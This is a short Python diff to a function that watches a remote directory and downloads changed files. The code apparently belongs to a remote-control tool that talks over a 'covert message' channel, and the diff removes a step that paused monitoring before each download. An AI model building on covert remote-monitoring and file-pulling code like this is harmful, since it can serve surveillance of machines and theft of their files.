@@ -427,9 +427,6 @@ def cmd_monitor_dir(comm: Commander):
             remote_file = os.path.join(path, fname)
             print(f"[{ts}] 目录文件{action}：{remote_file}，准备下载…")
 
-            # —— 暂停监控 ——
-            comm.send_covert_message(b"CMD_STOP_MON_DIR")
-            time.sleep(0.5)  # 等待监控线程退出
 
             # —— 执行下载 ——
             try:
